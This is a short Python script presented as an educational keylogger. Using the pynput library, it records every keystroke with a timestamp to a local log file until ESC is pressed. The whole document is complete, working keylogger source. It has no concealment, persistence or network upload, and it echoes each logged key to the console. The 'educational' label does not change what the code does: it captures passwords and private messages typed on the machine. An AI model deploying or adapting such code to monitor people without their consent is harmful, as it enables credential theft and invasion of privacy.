#!/usr/bin/env python3
"""
Simple keylogger for educational purposes.
Logs keystrokes to a file on the same drive.

Run with: /path/to/keylogger-env/bin/python keylogger.py
Or: python3 keylogger.py

For learning/security research only. Use responsibly.
"""

import os
import sys
import datetime
from pynput import keyboard

# Log file path - same directory as script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR, "keystrokes.log")

def get_log_path():
    """Allow user to specify custom log path via argument"""
    if len(sys.argv) > 1:
        return sys.argv[1]
    return LOG_FILE

def on_press(key):
    """Log each key press"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        # Handle regular character keys
        char = key.char
        log_entry = f"[{timestamp}] '{char}'\n"
    except AttributeError:
        # Handle special keys
        special_key = str(key).replace("Key.", "<") + ">"
        log_entry = f"[{timestamp}] {special_key}\n"
    
    with open(log_file, "a") as f:
        f.write(log_entry)
    
    # Optional: print to console so you know it's working
    print(f"Logged: {log_entry.strip()}")

def on_release(key):
    """Stop on ESC key"""
    if key == keyboard.Key.esc:
        print("\n[!] ESC pressed - Stopping keylogger...")
        return False

if __name__ == "__main__":
    log_file = get_log_path()
    
    print("=" * 50)
    print("Simple Keylogger - Educational Purpose")
    print("=" * 50)
    print(f"Log file: {log_file}")
    print("Press ESC to stop logging")
    print("=" * 50)
    print()
    
    # Create log directory if needed
    os.makedirs(os.path.dirname(log_file) or ".", exist_ok=True)
    
    # Start listening
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print(f"\n[✓] Session ended. Logs saved to: {log_file}")
